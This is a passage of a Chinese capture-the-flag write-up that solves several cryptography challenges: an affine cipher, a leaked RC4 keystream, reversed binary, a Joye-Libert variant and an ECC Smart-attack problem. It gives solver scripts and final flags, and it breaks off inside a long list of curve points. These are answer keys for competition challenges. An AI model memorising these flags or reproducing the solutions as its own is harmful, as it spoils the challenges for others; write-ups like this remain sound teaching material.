+<p>推导密钥：通过观察给出的两组提示，从 F(5) 变成 J(9)，以及从 T(19) 变成 X(23)，可以看出字母的索引值都刚好增加了 4。这说明加密的乘数 a &#x3D; 1，偏移量 b &#x3D; 4。</p>
+<p>验证条件：题目要求 a 必须与 26 互质。这里 a &#x3D; 1，显然与 26 互质，条件成立。</p>
+<p>降级解密：因为乘数 a 等于 1，这个仿射密码实际上退化成了简单的凯撒密码（向后平移 4 位）。</p>
+<p>得出明文：我们只需要将密文 QJBXQJFXZAKL 中的每一个大写字母，在字母表上往前倒推 4 个位置（遇到 A 再往前就回到 Z），即可得到明文。</p>
+<p>最终 Flag &#x2F; 明文结果</p>
+<p>MFXTMFBTVWGH</p>
+<p>解密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def decrypt(ciphertext, a_inv, b):</span><br><span class="line">    plaintext = &quot;&quot;</span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        if char.isupper():</span><br><span class="line">            # (y - b) * a_inv mod 26</span><br><span class="line">            y = ord(char) - ord(&#x27;A&#x27;)</span><br><span class="line">            x = (a_inv * (y - b)) % 26</span><br><span class="line">            plaintext += chr(x + ord(&#x27;A&#x27;))</span><br><span class="line">    return plaintext</span><br><span class="line"># 已知 a=1, b=4，a的模逆元 a_inv 也为 1</span><br><span class="line">ciphertext = &quot;QJBXQJFXZAKL&quot;</span><br><span class="line">print(&quot;明文:&quot;, decrypt(ciphertext, 1, 4))</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;MFXTMFBTVWGH&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RC4的密钥泄露"><a href="#RC4的密钥泄露" class="headerlink" title="RC4的密钥泄露"></a>RC4的密钥泄露</h3><p>本题思路如下：</p>
+<p>根据RC4流密码的特性，加密和解密过程本质上都是明文&#x2F;密文与密钥流进行逐字节的XOR运算：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps41-1775522773335-66.jpg" alt="img"> </p>
+<p>已知明文片段 $P$ 为 TestData_ForRC4_Decrypt（取前22字节即 TestData_ForRC4_Decryp）。对应的密文C的十六进制为：54 65 73 74 44 61 74 61 5F 46 6F 72 52 43 34 5F 44 65 63 72 79 70如果我们把这串十六进制密文直接转换回 ASCII 字符，会发现：54&#x3D;T, 65&#x3D;e, 73&#x3D;s, 74&#x3D;t, 44&#x3D;D … 79&#x3D;y, 70&#x3D;p即密文转换成字符串后，与明文完全一致。</p>
+<p>根据异或运算规则，如果一个数异或另一个数结果等于其本身，那么这个密钥流字节必然是 0（十六进制 0x00）。</p>
+<ol start="2">
+<li>解密目标密文 (C_flag)</li>
+</ol>
+<p>由于同一密钥生成的密钥流固定，目标密文在解密时同样是与全 0x00 的密钥流进行异或。</p>
+<p>任何数与 0x00 异或都保持不变，这意味着目标密文的十六进制直接对应的 ASCII 码就是最终的 Flag 明文。</p>
+<p>目标密文（十六进制）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66 6C 61 67 7B 70 6F 6C 61 72 5F 6B 69 6E 67 6B 69 6E 67 7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407084723194.png" alt="image-20260407084723194"></p>
+<p>flag: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;polar_kingking&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="冰原上的OTA谜题"><a href="#冰原上的OTA谜题" class="headerlink" title="冰原上的OTA谜题"></a>冰原上的OTA谜题</h3><p>本题思路如下：</p>
+<p>我们只需要将题目给定的错误二进制密文，将每八个的二进制串按位逆序(左右翻转)，然后直接转换为十六进制即可。</p>
+<p>计算过程：</p>
+<p>我们将给出的 16 组二进制逐一进行翻转转换：</p>
+<p>第 1 组：11010110 翻转为 01101011，十六进制为 6b</p>
+<p>第 2 组：10010110 翻转为 01101001，十六进制为 69</p>
+<p>第 3 组：11101001 翻转为 10010111，十六进制为 97</p>
+<p>第 4 组：10101100 翻转为 00110101，十六进制为 35</p>
+<p>第 5 组：01100101 翻转为 10100110，十六进制为 a6</p>
+<p>第 6 组：01001011 翻转为 11010010，十六进制为 d2</p>
+<p>第 7 组：10111001 翻转为 10011101，十六进制为 9d</p>
+<p>第 8 组：11011011 翻转为 11011011，十六进制为 db</p>
+<p>第 9 组：01110110 翻转为 01101110，十六进制为 6e</p>
+<p>第 10 组：01011001 翻转为 10011010，十六进制为 9a</p>
+<p>第 11 组：11001101 翻转为 10110011，十六进制为 b3</p>
+<p>第 12 组：10110101 翻转为 10101101，十六进制为 ad</p>
+<p>第 13 组：11001011 翻转为 11010011，十六进制为 d3</p>
+<p>第 14 组：10001101 翻转为 10110001，十六进制为 b1</p>
+<p>第 15 组：01011101 翻转为 10111010，十六进制为 ba</p>
+<p>第 16 组：11101011 翻转为 11010111，十六进制为 d7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6b699735a6d29ddb6e9ab3add3b1bad7&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我使用的是随波逐流里的进制转换：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps42-1775523033131-69.jpg" alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps43-1775523033131-68.jpg" alt="img"></p>
+<h3 id="伪ASR"><a href="#伪ASR" class="headerlink" title="伪ASR"></a>伪ASR</h3><p>本题思路如下：</p>
+<p>这是一道基于 Joye-Libert 密码系统变体的题目。</p>
+<p>先分解 n，得到p,q,利用 Pohlig-Hellman 算法，逐位求出离散对数 m,下面是解密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import json</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from sympy.ntheory import factorint</span><br><span class="line"># --- 题目已知参数 ---</span><br><span class="line">n = 500532925884017190157531654042977388637611201227338971326884172046371105194776392356795147</span><br><span class="line">y = 213088474978954913521695933149257926315459990908578573756933176330915972508162260163992936</span><br><span class="line">cs = [</span><br><span class="line">    57494912618263048538571755953837772127117773898872797680570116373460237301011181142984690, </span><br><span class="line">    344186007342959044249362172584754916978318670779607618696087105142714882053499189453591750, </span><br><span class="line">    11170932486684627637967687021711067484959106608189352734064089980678923008744240797135422, </span><br><span class="line">    73837068555811384284867151570572743386582880055013744261872093001909203963879165023864836, </span><br><span class="line">    64356403000986744386743473269071732498867064770469172347340097989063717305436807805878673</span><br><span class="line">]</span><br><span class="line">k = 79</span><br><span class="line"></span><br><span class="line">def get_p_auto(n, k):</span><br><span class="line">    print(&quot;[*] 正在全自动分解 n...&quot;)</span><br><span class="line">    </span><br><span class="line">    # 第一套方案：白嫖 FactorDB 的接口（秒解）</span><br><span class="line">    try:</span><br><span class="line">        url = f&quot;http://factordb.com/api?query=&#123;n&#125;&quot;</span><br><span class="line">        req = urllib.request.urlopen(url, timeout=5)</span><br><span class="line">        data = json.loads(req.read().decode(&#x27;utf-8&#x27;))</span><br><span class="line">        if data.get(&#x27;status&#x27;) in [&#x27;FF&#x27;, &#x27;CF&#x27;] and len(data.get(&#x27;factors&#x27;)) &gt;= 2:</span><br><span class="line">            print(&quot;[+] FactorDB 命中！已瞬间拿到因子。&quot;)</span><br><span class="line">            factors = [int(f[0]) for f in data[&#x27;factors&#x27;]]</span><br><span class="line">            for f in factors:</span><br><span class="line">                if (f - 1) % (1 &lt;&lt; k) == 0:</span><br><span class="line">                    return f</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] FactorDB 查询失败 (&#123;e&#125;)，转入本地强解...&quot;)</span><br><span class="line"></span><br><span class="line">    # 第二套方案：本地 sympy 强解（可能需要几十秒，请泡杯茶）</span><br><span class="line">    factors_dict = factorint(n)</span><br><span class="line">    print(&quot;[+] 本地分解完成！&quot;)</span><br><span class="line">    for f in factors_dict.keys():</span><br><span class="line">        if (f - 1) % (1 &lt;&lt; k) == 0:</span><br><span class="line">            return f</span><br><span class="line">            </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def decrypt_block(c, p, k, y):</span><br><span class="line"></span><br><span class="line">    r = (p - 1) // (1 &lt;&lt; k)</span><br><span class="line">    C = pow(c, r, p)</span><br><span class="line">    Y = pow(y, r, p)</span><br><span class="line">    </span><br><span class="line">    m = 0</span><br><span class="line">    inv_Y = inverse(Y, p)</span><br><span class="line">    inv_Y_pows = [pow(inv_Y, 1 &lt;&lt; i, p) for i in range(k)]</span><br><span class="line">    </span><br><span class="line">    C_current = C</span><br><span class="line">    for i in range(k):</span><br><span class="line">        test = pow(C_current, 1 &lt;&lt; (k - 1 - i), p)</span><br><span class="line">        if test == p - 1:</span><br><span class="line">            bit = 1</span><br><span class="line">        elif test == 1:</span><br><span class="line">            bit = 0</span><br><span class="line">        else:</span><br><span class="line">            raise ValueError(&quot;解密出错，数学逻辑崩溃了。&quot;)</span><br><span class="line">        </span><br><span class="line">        m += bit * (1 &lt;&lt; i)</span><br><span class="line">        if bit == 1:</span><br><span class="line">            C_current = (C_current * inv_Y_pows[i]) % p</span><br><span class="line">            </span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    p = get_p_auto(n, k)</span><br><span class="line">    if not p:</span><br><span class="line">        print(&quot;[-] 因子获取失败，请检查 n。&quot;)</span><br><span class="line">        exit()</span><br><span class="line">        </span><br><span class="line">    print(f&quot;[*] 成功确认 P 值为: &#123;p&#125;&quot;)</span><br><span class="line">    print(&quot;[*] 正在执行 Pohlig-Hellman 逐位解密...&quot;)</span><br><span class="line">    </span><br><span class="line">    flag = b&quot;&quot;</span><br><span class="line">    for idx, c in enumerate(cs):</span><br><span class="line">        m = decrypt_block(c, p, k, y)</span><br><span class="line">        flag += long_to_bytes(m)</span><br><span class="line">        print(f&quot;  -&gt; 块 &#123;idx+1&#125;/&#123;len(cs)&#125; 解密完成&quot;)</span><br><span class="line">        </span><br><span class="line">    print(&quot;\n[+] ========================================&quot;)</span><br><span class="line">    print(f&quot;[+] 拿走你的 Flag: &#123;flag.decode(errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line">    print(&quot;[+] ========================================&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;go0_j06!let1sm0v31n_t0_th3renges~&gt;_&lt;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ECC的攻击模块"><a href="#ECC的攻击模块" class="headerlink" title="ECC的攻击模块"></a>ECC的攻击模块</h3><p>本题思路如下：</p>
+<p>题目给了一堆椭圆曲线点 Qi，满足：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps44-1775523344689-73.jpg" alt="img"> </p>
+<p>对曲线上的点(x,y)满足</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps45-1775523344689-72.jpg" alt="img"> </p>
+<p>把多个点代进去，消去 a,b可以构造出若干个 p 的倍数，对这些值取 gcd 就能恢复出 p。之后再用两点解出a,b.</p>
+<p>然后再用个Smart Attack，再做一次 LLL，就能把最短的消息列规约出来。</p>
+<p>解密脚本（sagemath）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from math import gcd</span><br><span class="line"></span><br><span class="line">pts =[(4713513545399586887294281187501009141689080934674926984853052046637141607331993392136186920709675152470824454822335527736604585312216293390500894812356575, 10152198551269550712132843544953877513974069303791371586626547671550636936369607844350995807520993189830394615282586805640124173078292476320861958178531199), (8497709856659541496506566158438727086633064779296427286612559352247045304592577869075723270252557382159636274220949698085489427175611575498725494187042219, 9116811362014883884879981282521462123463402369273722016008105935084826801111377968641225157887930975588405833350168170885178864192235006321249285744756607), (9370988588550376568847533229569651406006327680521920971380933472551236466257993862023372207379492794618019196741718902793769742423589142369766582541381456, 2964764716081715738931864218952095017577031943078710662273038672326443429898927649838098895380036049701254956968440876093577389832396678079667784517400438), (9780561431490704165761200835168742342147019392307027843608906950941244751705916411353543429159840043103272583252784603317509552870673884311510395715589823, 4512360262119206250842086638048812502384840258083296584133384225879227543325169341795597008831855800692604773248185325609068166181249185285419214480894245), (9753892250466466740522543908112180868496775086018060713800521963469049945379911034546236677650557303039887137123496849920375395729255201971208204340312401, 1938991444752122074176200366358680893894177968559383024484416921026824613924903539687055302548680671218740698360348493115771464268448199996301653785482255), (3956377375220167264841327493686873211450973487259797861617968170206067349893946190638797758839551762336875162001035221844923167039774464458844780587411290, 2811884831397970155720238376608187196147035379379721383527942003189302602153280352219864817477497801745704924766135613808068056390979231466645561668031024), (9666287196438318899841485440079998120284795375413795856320443556455924086216013060731258663630259450515687636598820588811051314151419247760340027636254010, 6242436280614711684558785155511593403934172620329392146413928090178040475814185607897887229598797388837994931615621147403337923088271068952762638016855590), (6410558156839007797687898586831013305762106341458065938664504823229266562576428647033727809573119925974366171334827235046449418027002452010139094706683524, 166040140975198871456147224171862912756049890094169801765109995587970035602951233459371050668124316347586947163116257377961189202602060040019748070219990), (7487523686996071358586432253848922887425506981897556365676381361674713123268395354139090901692108603574450937831189242041732109717228219023361891682059858, 3833064097409451074126677286511876656776323298352406335396385518824369065179582162537034691375770260284647652021989411071188459726289169799948499527352978), (4729078931071331163964102690008525906997212672160480378168436234117369684502122703336874338708993594555380660201608846607091713539215909055852251780666200, 9671005639423355090071773219691535311565452170612214746096012853592987212889402308479743500146866239496815147634771960998944036591154433878637345854681580), (6821686173012785249374727322813382690658902308759017953636851870535291459139748120517278436478763860649866374062463951709695342159037267531366354633119425, 454109349563783364627292840194986877835558881374972642229389545049685682117058018008055923374865359150490448558569535600064463313774005486853335528084868), (8097352798426399714734815712595721555460575301502694560292887744521254417566780198441732519052015108845518267351690594699620710114415927821492280557184961, 3143117134725172187551030220914090560736539268901574157885702648644662853782339667244393783677404575650558122950108703297687085677618671682413400999092492), (6513183126611071344734801408546155978497170719570544711452832905026449120538993019567678246149684116904668717489068578437282308835637038352023972256007784, 8595256417577044566295431272464816721415384447710220168112404314046298881021487795315799293386989967911497645651199195527326646204582743481992783130665695), (2076200911997145561230367295021401989448362508676000676577311337299144867938580996744776932574458926497687916072562094577782433445706636680764023115075901, 4185181876972327147075282615187299338935965887368883151241490415013808432719173146515945602139988343152455030760117095904414901357566253216420331574702142), (8381148261138239703852416544878169891675330535019140791244013907671539392169214622437710482164782450053349339730858222886346055951588212694455090992026758, 10163796644510826165062555164776253676683391937554299535024512638738572461507137822548694428887856947619206289961946341513952367341327961199388454010911345), (7082052828661106343309085153914890287304976485666067977869367415115311594266326288964638667384892162749794084356403456012624482827804555380041185165461610, 10970779558480467455850489414892463070247230105462800369438019696961142385993997445973377590939104585064920741469159965752608152462788217994666526971187676), (10925547866913717228347553467715877154535344097358915967045800604047245512707552888643862816712660316383731871281241836192113460647119393339781321061847546, 6055866638544128750097137956427321128332370171075374382430335937167361572997526522356283730243910934362510966098560693257514648296238021784063773472282317), (6785790260925369751944279679131967774385917676053671994816660134554688581275392628347250117223466845286763120154394370759728270091856895114610818897127496, 6944819097069963408944767211243358274272483862643515403213512319523594830818990162549356650095103065424909926139792747369879142585803045804022938030858720), (10150680299085473411999071651257510437835183830128617479150385170276511661416391671621212657988922640891651500543376218492424168354335425534467598112916367, 6888072072792068816925242651491095512907051998862014192078971292171690924351979706726926617264447271133901394941261441480528738783229729193335653038691067), (6144733739837148454772329326705634341817968434802231929905485148699984301367998724275922187148848520362233957437728130259536441574897386258118529064688341, 6922401772481881149066720640583520627817261494001167856510602081133635708642763148740953963043376201851410699406141136890064725776678780016786484847583214), (7183537698681045949875783519960782529707812105971837366532045033353552615284313247237848218535204838266158925723440665819577893781022458960790760810597397, 972458879736849097211443260725151606545512204610922585342131271017385141140207247723299888723549405720647865837813721206081762170996939779151465778359883), (1703616895475378292849103149650192818023569782199400711730101432265869461747826906638002389489855890866591624514624290243581490849013123852690673668158707, 3965658649904842831282861075974019284939181243027712551012404295076584641786237749626883865637323655400727181532596793962284990080186320814580576232764219), (8963495302555958703784098831852945750716266028695276241049279835560446187278067379699423883547371501029976357779282379030218705676796414104820180108129131, 9560675517442950285567098226729931887208424165598207710747610570352243682357219160075511868468892440533601005756017577676212645247627512657664612197886753), (5895842943761546170585247530130278876214835406657491371251930010354754539149126507657276091840277248547506799183780141446090851820226059572960774100958968, 7502656301329564949518360786200839569606634784837274630989884217434653385706698020742131117367834019542645778778345958194210006811683442080243977814147856), (8640100751937124680820611508642732502895060458726683545757217842488862932846036386984435316630861618902973439137510767460729980613091227298179451141360505, 8882095605573426533581887021721414251562279415082941499209814199741153497994653123467952083382221269756103559259084746736753166028905023164640314021714001), (8388247659079623573428713053298218758880959226750090682709831798344118488654853756660826146966546928039026596856245651901691263742527856567914497516291114, 2554686546158926080572492543354230379583890635573966376628896520173183537504248326545786454456701917490537148658673048732906884172862899535090764870061838), (3522972508923517458292353763302819930303577548750539717212833970429996939300225630636854038507526101228562069393852224597963907070523982294660351842280633, 2722886940087289673479756522605024512774339223436171406753474672760772800787941732367711740776438505211011207232095730057266822772428493683405241349648820), (5747287482977987126791251898912454610276486805219445014219573080628876839977604195669030439484891046209507206924952426057204453046696371912908633064230479, 6888743201368571672232377272185024669203662616683269994478128192921909999937032609025815813649655882205087573705374103086536384400013495005395551198713651), (5395805452593588173733709867409415556635519685320679663417386653285203287195773348337753725970479425032796150389196920192180585906474753231777661079289437, 2049198785703634792274246696306539108405783634680414306952855128318576045437021450775416575637372374508674635396511497565807111357058258974223438148878139), (1106569381500878776327074503776544923606655454675632799210090625837364461937678338160512692988670222225824403087574662143185601960224018905113923782270539, 7807167264259112235256140538958359886355420172448675887504580682313196334695678083464576229080110711789720570909552233828459789174622915149390826529983979), (774420854887127501308191286785213114311123916232266805877360705182482499403790079656851056723325281443761295724878231930299234031094963169518924985204326, 1823239988080736026294280175757387698370391442147440999541017982717190148487204580007594680643967202283878443924878273089191744975594960310070541049913208), (10390768586716868216274885948565940967753406041172076158220674075063692958975829973565237035576416388533593319064806625802185370125475892280705287378008167, 7936898961487579224597034819214266150399838606754275451599382249114378117387985558608837253849686999975720266799298482522115282514491361371396094456368516), (6559061475296632413236056122203276549479841984223974661947570674250692681575131892757949944065429272895838779365614183240180694750678008976228961748322336, 473245583943987902110281484140499960244770537636405429845479764689369773269971976056888748769095922326063256384576160463655904425218553458364943959899086), (6990897946181173410381225887279699398546212633701662109218390739579375069633389645336979977106684274400300780444554545122065074307060125703820181316384214, 7819208183328181779638777784468566190149101582692741398921460936301776675490965897874825617770665564614702759841245059168666900633861059762858637125280948), (7747435518316782982483754090978229664138034777481959364950240813857697188791265248527812695232235005608599944025036371707403013790647331893879773212237043, 3159418369091201654146413539772282132593105789449657281371263577186276285132860600728403344673301949317743362672738811296195856181843548485016286031920833), (3369791038393301556741708575440525525282467890252654592506744643498949048083071439806419974633826916428682344210022547978555038915574927383371276122836437, 1254207105162683404624839305815976360434593439971534044690683811862373371974690050945107547088863949294187872065584471393112103746592673505295745839104903), (12559802051565696220908490791176980888215159475214543819591025553038397887258210157937107348856671923347442195747214530113819589139784491311068764022315, 92137825928577563592704152890340316446433940657283569689729668523058912940157586067464548561955548003087234875918821018302106943344124622115389236652708), (5530860676475771990691794230197843848995136632588902707671870008682291466072853151674692329856555254129777934598717106397379676504637402898491515647019614, 7607657346401777274388222553201723127198119754377956597528780653945092019992176978208398510287887955973308860512490030992878891943040624792754656069217442), (8656514966764534509634687395591541433018230421930114964742418579055006526313285528361583224660642964199912067740313821869193158938537412710631568658169841, 4116821657037353549042717433725360946713128495027684788081224012710596099770343092504822988643111922114078504358308321081016458737603136815718086377286312), (8100831214626791708799713927585164778396993990058862482613985356488740056554280863238290359683223040430278300948843843441559818431263141038149252959678174, 7157146800294342965648679696235976006969454630987554609240655182227200766624871072125866911886299487131892259075918834107331341357650921521849485533872689), (10890755415745834079684707961450267393014312434887212673127786238658853553163490057950949556382435981261018626537652744836077613969932720662450748419434520, 5279648749877701240684141308917960279039127385754415377927568487239966645994472078390526598966778096179381589406514532819180811465019758802791435100869881), (9060075587488082866770299601000001129096055062459420816879850056758836467625363905808761432389493095202971219869587736150065097181836148704494938392336936, 3043213364684213962601012696251843801198320049133534260158876000568009047174757647991108751400672840493299153730363664649892567435814928501814954691990523), (3900860495400935419474632339214283753209440821844587105288679983316600743413043557244051819610723553012673147837484933074775700024738029322306219374175466, 8776159342624965969607240788610667981250366112487928135123108438906795434150675020540621553123713010466600434042759568095802865668466320036637390801734330), (8892508982428674296232570395108858435301220674549059757865650461633339757693888275460458282826216723318314278599996754746396225250466370460643994463970197, 9849460100328796212561749973397004158854148228901082087955317687788087821727683490635917903048647923933946683751563384919385239051043522197194110574632931), (10923358262051920487577188144536432256688530690409723011811352726717234614031126144612568470205593144080520262586830305738866710154785063559118988651582041, 4278762242548247544689233335926765616778120425273995711653646115727314071200548262199619769930492354067641770131381420729138534905254921562061287863678579), (8521580982419336726352152980518468054450102755517772937105339841639190905405892229656525386511809992487375982957938116145220023166622765996136275506785708, 10265827555400740987534703970942130173226636930554901199221250047258482081430913795266364437774976529788958093275042612558863535039271906282995137107627584), (2430642973360021054121784023477961807614448837359566950318322641585771572293505818234749487480093838215922820793766334539353762952507350475454732071659280, 2400499438983618692940189159631700542159222145491707907027391147659206494582970021302820336545010218513371064646527061311337068413980426448598708547679798), (6379663781361193014611200449797118722129634709503471706511279908764536219938459648859196147463736132344180113778601092741603098330061376323115464482342107, 8629554835368413912047551895840667218749053694545768537773896290059422290401463412017509705385398630783522251377233215565765194397930999511058978622876057), (7039065139500440281589307484102024271785176578683825020200946781098528981772443757014579531023297605219645322785589400163170871971836743493541233816898079, 4593229824372611907908775103450734214568303649676465133144653410051204005622425211159365276096465994869689264858974694128055897237933264343138656426877465), (11088093414029687628702921161107971796563312667327731805188741006469622384974659087755849834839203706047127005849568892168009150026723050453762252290082778, 2151567957127055257938140101478880653268415988826108946410001040705617336396510646577379112035863270338411831043142418830961326317785031136861804470304272), (10527694926095406031055185608275990554917090867921483961252788111078656198776927709171605054020314909280105508156201380170019108019175165984666471816770594, 10044940218068599613230634351641979827962921774265515550080566334481685130172827660677357621962754333445207367021790472455047451902749027433440310564392697), (9392436380839172882423963605949104094720677145349689577098509262697547555527268631599802779619266044983435905142007889266132399049867054730413893986040305, 164988482694870464413980138114343351662368942522471497717693908999698594387612234316498805037115936509113904833527763580932561835992784658496880185984866), (6956127737676490531426292131711872627247522259519705465384740100713218133674100965647277804272106953560643561751864433453923392267380411688968307071846307, 9164160949738360274512571610611956476656760651609341958216699025952454982289806396960546657642237157594546056678501123816848520997714132881419972438316403), (811174123406561700124279452048287283175389028135402047183215845338560775921962161974354282314553287452152276791227225547913526788464685283530555377504007, 4788900230259888619400556812427804331693848584040562124584037893249458247256424125541021023833225951620197555951694180569171171724979793094969554101952303), (1736682233486154410683835113015869629344648044580356253776803828767105159078666677116346579157444431929727831155640042184966782986536913298785407623707811, 5956479242552381563937300276377111345336991759070088400187861710482585910274532388075515699967940448034902119327442934275702408190006193692603919706443549), (4013279525694194347173154308911473420544385422498550718364692313155299215442908150551148501460496135245782361634203378846625926895085512415201537236895566, 1902753177706390097624306921789800778334195217542569757651857913301043355955459634821266031304005762631830538130632222369647843207148891353757813170297434), (4067507997965444976624685861896057234479418730640313763444629188870627444034819511881954765484464718227600918892299096151015302916608648437841689686039317, 4527385289218936918812173343439467707015227095224290359264738892108388706321564070183843485435827312334758607812585337722137614610114122030643878945779279), (338997763033935532814869176902554820400024788841829984365895451611815957160485020645467219597211333339002110402243665331243416196279868343210212041580190, 3485582242772643502405014036023218379736455098673589612235775614645540773027817032226979547104676034198998099892299215333525232022350297267244591667693912), (5766985815237821769598206059493311507378085744889305837305779902407188403983388373601086132780913691855876288394922334989682149049340300098915770228030905, 